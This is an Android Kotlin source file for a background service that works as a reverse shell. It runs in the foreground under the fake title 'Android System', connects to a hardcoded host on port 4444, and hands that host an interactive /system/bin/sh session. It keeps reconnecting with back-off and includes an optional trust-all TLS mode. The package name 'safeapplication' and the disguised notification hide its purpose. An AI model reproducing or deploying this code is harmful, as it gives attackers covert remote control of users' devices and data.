package com.solisindago.safeapplication

import android.app.*
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import java.io.*
import java.net.InetSocketAddress
import java.net.Socket
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.SocketFactory
import javax.net.ssl.*
import kotlin.concurrent.thread
import kotlin.math.min

class ReverseShellService : Service() {

    /* ------------ CONFIG  ------------------------------------------------ */

    private val HOST          = "192.168.1.224"
    private val PORT          = 4444
    private val USE_TLS       = false        // flip true for TLS + self‑signed
    private val INITIAL_DELAY = 2_000L       // first reconnect delay 2 s
    private val MAX_DELAY     = 60_000L      // max back‑off 60 s
    private val PING_INTERVAL = 30_000L      // send '\n' every 30 s to keep NAT open

    /* ------------ LIFECYCLE ---------------------------------------------- */

    override fun onCreate() {
        super.onCreate()
        startAsForeground()
        thread(isDaemon = true) { connectLoop() }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    /* ------------ Foreground notification -------------------------------- */

    private fun startAsForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                "rshell", "Android System",
                NotificationManager.IMPORTANCE_MIN
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
            val notif = NotificationCompat.Builder(this, "rshell")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setContentTitle("Android System")
                .setContentText("Service running")
                .setOngoing(true)
                .build()
            startForeground(1, notif)
        }
    }

    /* ------------ Main connect‑retry loop -------------------------------- */

    private fun connectLoop() {
        var delay = INITIAL_DELAY
        val socketFactory: SocketFactory = if (USE_TLS) trustAllTlsFactory() else SocketFactory.getDefault()

        while (true) {
            try {
                if (!isNetworkUp()) {
                    Thread.sleep(delay)
                    continue
                }

                (socketFactory.createSocket() as Socket).use { sock ->
                    sock.connect(InetSocketAddress(HOST, PORT), 5_000)
                    sock.tcpNoDelay = true

                    // reset back‑off after success
                    delay = INITIAL_DELAY

                    // spawn shell
                    val proc = Runtime.getRuntime().exec(arrayOf(
                        "/system/bin/sh", "-c",
                        "cd /sdcard; exec /system/bin/sh"
                    ))

                    // bi‑directional pumps
                    val t1 = proc.inputStream.pipeToAsync(sock.getOutputStream())
                    val t2 = proc.errorStream.pipeToAsync(sock.getOutputStream())
                    val t3 = sock.getInputStream().pipeToAsync(proc.outputStream)

                    // keep‑alive ping thread
                    val ping = thread(isDaemon = true) {
                        while (!sock.isClosed) {
                            Thread.sleep(PING_INTERVAL)
                            try { sock.getOutputStream().write('\n'.code) } catch (_: Exception) { break }
                        }
                    }

                    // wait for shell exit
                    proc.waitFor()
                    sock.close()
                    ping.interrupt()
                    t1.interrupt(); t2.interrupt(); t3.interrupt()
                }

            } catch (_: Exception) {
                // back‑off with cap
                Thread.sleep(delay)
                delay = min((delay * 1.5).toLong(), MAX_DELAY)
            }
        }
    }

    /* ------------ Helpers ------------------------------------------------ */

    private fun InputStream.pipeToAsync(out: OutputStream) = thread(isDaemon = true) {
        val buf = ByteArray(1024)
        try { while (true) { val len = read(buf); if (len < 0) break; out.write(buf, 0, len); out.flush() } }
        catch (_: IOException) { /* peer closed */ }
    }

    private fun isNetworkUp(): Boolean {
        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val cap = cm.getNetworkCapabilities(cm.activeNetwork) ?: return false
        return cap.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    /* ---- Trust‑all TLS socket factory – lab use only -------------------- */

    private fun trustAllTlsFactory(): SSLSocketFactory {
        val ctx = SSLContext.getInstance("TLS")
        val trustAll = arrayOf<TrustManager>(object : X509TrustManager {
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
            override fun checkClientTrusted(c: Array<X509Certificate>, a: String) {}
            override fun checkServerTrusted(c: Array<X509Certificate>, a: String) {}
        })
        ctx.init(null, trustAll, SecureRandom())
        return ctx.socketFactory
    }
}
